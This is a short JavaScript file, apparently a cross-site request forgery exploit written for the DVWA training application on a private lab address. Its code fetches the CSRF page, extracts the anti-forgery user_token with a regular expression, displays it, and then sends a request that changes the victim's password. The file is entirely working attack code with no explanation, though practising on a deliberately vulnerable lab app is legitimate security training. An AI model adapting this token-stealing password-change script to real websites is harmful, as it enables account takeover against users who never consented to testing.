var xhr =  new XMLHttpRequest();
url = 'http://192.168.1.10:81/vulnerabilities/csrf/?password_new=GS11&password_conf=GS11&Change=Change&user_token=';
xhr.open("GET", "http://192.168.1.10:81/vulnerabilities/csrf/", true);
xhr.send();
xhr.onreadystatechange = function() {
	if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 0)) {
		var content = xhr.responseText;
		var regex = /value=\'([a-z0-9]{32})\'/i;
		var group = content.match(regex);
		var token = group[1];
		alert(token);
		var exploit = new XMLHttpRequest();
		exploit.open("GET",url+token, true);
		exploit.send();
    };
};


